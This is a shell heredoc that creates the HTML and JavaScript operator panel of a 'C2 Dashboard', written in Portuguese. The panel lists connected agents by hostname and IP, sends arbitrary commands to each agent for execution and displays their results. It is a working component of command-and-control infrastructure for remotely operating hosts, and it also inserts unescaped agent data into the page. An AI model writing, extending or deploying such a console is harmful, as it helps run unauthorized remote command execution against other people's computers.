cat > web/templates/dashboard.html << 'EOF'
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>C2 Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
        }
        .header {
            background: #001a0f;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ff41;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #001a0f;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #00ff41;
        }
        .stat-number { font-size: 36px; font-weight: bold; }
        .agents-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }
        .agent-card {
            background: #001a0f;
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #00ff41;
        }
        .agent-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff41;
        }
        .status.online { background: #00ff41; color: #000; padding: 2px 8px; border-radius: 5px; }
        .status.offline { background: #ff0000; color: #fff; padding: 2px 8px; border-radius: 5px; }
        .command-form { display: flex; gap: 10px; margin: 15px 0; }
        .command-input {
            flex: 1;
            background: #000;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 10px;
            font-family: monospace;
        }
        .send-btn {
            background: #00ff41;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
        }
        .task-history {
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
        }
        .task-item {
            padding: 5px;
            margin: 5px 0;
            background: #000;
            border-left: 3px solid #00ff41;
        }
        .loading { text-align: center; padding: 50px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 C2 DASHBOARD</h1>
    </div>
    <div class="stats">
        <div class="stat-card"><div>AGENTES ONLINE</div><div class="stat-number" id="onlineCount">0</div></div>
        <div class="stat-card"><div>TOTAL AGENTES</div><div class="stat-number" id="totalCount">0</div></div>
        <div class="stat-card"><div>COMANDOS</div><div class="stat-number" id="commandsSent">0</div></div>
    </div>
    <div id="agentsContainer" class="agents-grid"><div class="loading">🔄 Carregando...</div></div>
    <script>
        let commandsCount = 0;
        async function loadAgents() {
            try {
                const response = await fetch('/api/agents');
                const agents = await response.json();
                const online = agents.filter(a => new Date() - new Date(a.last_seen) < 60000);
                document.getElementById('onlineCount').innerHTML = online.length;
                document.getElementById('totalCount').innerHTML = agents.length;
                const container = document.getElementById('agentsContainer');
                if (agents.length === 0) {
                    container.innerHTML = '<div class="loading">⚠️ Nenhum agente conectado</div>';
                    return;
                }
                container.innerHTML = agents.map(agent => {
                    const isOnline = (new Date() - new Date(agent.last_seen)) < 60000;
                    return `
                        <div class="agent-card" data-agent-id="${agent.id}">
                            <div class="agent-header">
                                <span>💻 ${agent.hostname}</span>
                                <span class="status ${isOnline ? 'online' : 'offline'}">${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'}</span>
                            </div>
                            <div>🆔 ID: ${agent.id.substring(0, 8)}...</div>
                            <div>🌐 IP: ${agent.ip}</div>
                            <div class="command-form">
                                <input type="text" class="command-input" placeholder="Comando" id="cmd-${agent.id}">
                                <button class="send-btn" onclick="sendCommand('${agent.id}')">🚀 EXECUTAR</button>
                            </div>
                            <div class="task-history" id="history-${agent.id}">📭 Aguardando comandos...</div>
                        </div>
                    `;
                }).join('');
                for (const agent of agents) loadAgentHistory(agent.id);
            } catch (error) {
                console.error(error);
            }
        }
        async function loadAgentHistory(agentId) {
            try {
                const response = await fetch(`/api/agent_tasks/${agentId}`);
                const tasks = await response.json();
                const historyDiv = document.getElementById(`history-${agentId}`);
                if (!historyDiv) return;
                if (tasks.length === 0) { historyDiv.innerHTML = '📭 Nenhum comando'; return; }
                historyDiv.innerHTML = tasks.slice(0, 5).map(task => `
                    <div class="task-item">
                        <div>📌 ${task.command}</div>
                        <div>📄 ${task.result ? task.result.substring(0, 100) : '⏳ Pendente...'}</div>
                    </div>
                `).join('');
            } catch (error) { console.error(error); }
        }
        async function sendCommand(agentId) {
            const input = document.getElementById(`cmd-${agentId}`);
            const command = input.value.trim();
            if (!command) return alert('Digite um comando!');
            try {
                const response = await fetch('/api/send_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: agentId, command: command })
                });
                const result = await response.json();
                if (result.status === 'queued') {
                    commandsCount++;
                    document.getElementById('commandsSent').innerHTML = commandsCount;
                    input.value = '';
                    setTimeout(() => loadAgentHistory(agentId), 2000);
                }
            } catch (error) { alert('Erro: ' + error.message); }
        }
        setInterval(loadAgents, 5000);
        loadAgents();
    </script>
</body>
</html>
EOF
